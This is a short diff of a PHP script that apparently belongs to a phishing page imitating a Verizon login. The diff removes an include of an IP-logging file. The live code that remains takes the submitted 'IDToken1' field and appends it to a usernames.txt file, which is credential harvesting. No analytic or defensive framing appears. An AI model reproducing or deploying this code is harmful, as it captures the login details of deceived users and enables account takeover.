@@ -1,5 +1,5 @@
 <?php
-include 'ip.php';
+
 file_put_contents("usernames.txt", "Verizon Username : " . $email = $_POST['IDToken1'] . "\n", FILE_APPEND);
 ?>
 <?php
